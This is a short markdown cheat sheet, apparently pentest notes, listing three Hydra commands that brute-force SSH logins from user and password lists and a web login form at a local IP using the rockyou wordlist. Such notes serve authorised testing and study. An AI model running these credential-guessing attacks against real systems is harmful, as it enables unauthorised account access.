## SSH

```bash
hydra -L users.txt -P pass.txt x.x.x.x ssh -V
```

Using a file username and password file, separated by a `:`

```bash
hydra -C pass.txt x.x.x.x ssh -V
```

### Web-Post-Form

```bash
hydra -l kevin -P /opt/rockyou.txt 192.168.0.181 http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
```